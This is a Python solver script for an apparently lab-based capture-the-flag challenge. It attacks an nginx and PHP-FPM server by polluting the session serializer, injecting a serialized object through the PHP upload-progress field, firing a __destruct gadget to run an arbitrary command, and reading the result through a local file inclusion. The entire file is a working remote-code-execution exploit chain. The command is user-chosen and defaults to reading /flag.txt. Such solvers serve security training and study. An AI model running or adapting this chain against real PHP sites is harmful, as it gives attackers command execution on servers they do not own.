#!/usr/bin/env python3
"""
Chain C solver: handler mismatch → __destruct gadget → RCE
Target: nginx + PHP-FPM on port 80
Requires: single FPM worker (pm.max_children=1) — lab default
"""
import sys
import requests
import argparse

def exploit(host: str, port: int, cmd: str):
    target = f"http://{host}:{port}"
    session_id = "ctf_chain_c_1337"

    # Step 1: pollute FPM worker's PS(serializer) via /app/ endpoint
    print("[*] Step 1: Polluting FPM worker serializer via /app/upload.php ...")
    requests.get(
        f"{target}/app_serialize.php",
        cookies={"PHPSESSID": session_id},
        timeout=10,
    )

    # Step 2: inject serialized Evil object via upload_progress filename
    # php_serialize format: O:4:"Evil":1:{s:3:"cmd";s:<len>:"<cmd>";}
    serialized = f'O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
    payload = f"|{serialized}"  # pipe prefix triggers deserialization on php handler read
    print(f"[*] Step 2: Injecting serialized object via upload_progress ...")
    try:
        requests.post(
            f"{target}/app/upload.php",
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("x", b"x" * 512)},
            cookies={"PHPSESSID": session_id},
            timeout=10,
        )
    except Exception:
        pass

    # Step 3: trigger __destruct via /api/endpoint.php (uses 'php' handler)
    print("[*] Step 3: Triggering __destruct via /api/endpoint.php ...")
    requests.get(
        f"{target}/api/endpoint.php",
        cookies={"PHPSESSID": session_id},
        timeout=10,
    )

    # Step 4: read the output written to /tmp/rce_proof.txt via LFI
    print("[*] Step 4: Reading output from /tmp/rce_proof.txt via LFI ...")
    r = requests.get(
        f"{target}/vuln.php",
        params={"page": "/tmp/rce_proof.txt"},
        timeout=10,
    )
    print(f"[*] Output:\n{r.text}")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="php2shell Chain C solver")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--cmd", default="cat /flag.txt")
    args = p.parse_args()
    exploit(args.host, args.port, args.cmd)
